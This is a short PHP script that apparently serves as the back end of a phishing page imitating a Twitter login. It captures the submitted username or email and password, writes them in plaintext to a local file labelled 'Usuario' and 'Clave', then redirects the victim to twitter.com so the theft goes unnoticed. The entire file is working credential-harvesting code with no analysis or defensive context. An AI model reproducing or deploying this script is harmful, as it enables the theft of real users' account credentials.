<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['usernameOrEmail'] . " Clave: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/');
exit();
